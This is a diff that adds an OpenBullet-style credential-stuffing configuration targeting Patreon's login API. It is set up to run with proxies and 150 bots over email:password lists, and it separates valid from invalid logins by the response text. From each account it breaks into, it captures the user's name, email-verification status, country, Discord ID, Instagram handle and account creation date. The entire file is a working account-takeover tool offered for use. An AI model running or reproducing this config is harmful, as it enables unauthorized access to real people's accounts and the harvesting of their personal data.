@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "PATREON",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T16:15:02.2202856+01:00",
+  "AdditionalInfo": "Config By - WorldWarrior",
+  "Author": "WorldWarrior",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.patreon.com/api/login?include=campaign%2Cuser_location&json-api-version=1.0" 
+  CONTENT "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"},\"relationships\":{}}}" 
+  CONTENTTYPE "application/vnd.api+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password" 
+  KEYCHAIN Success OR 
+    KEY "{\"data\":" 
+
+#Username PARSE "<SOURCE>" LR "\"full_name\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+#Email_Verified PARSE "<SOURCE>" LR "\"is_email_verified\":" ",\"" CreateEmpty=FALSE -> CAP "Email Verified" 
+
+#Country PARSE "<SOURCE>" LR "\"country_code\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Discord PARSE "<SOURCE>" LR ",\"discord_id\":" ",\"" CreateEmpty=FALSE -> CAP "Discord" 
+
+#Instagram PARSE "<SOURCE>" LR ",\"instagram\":" ",\"" CreateEmpty=FALSE -> CAP "Instagram" 
+
+#Created_On PARSE "<SOURCE>" LR "\"created\":\"" "T" CreateEmpty=FALSE -> CAP "Created On" 
+
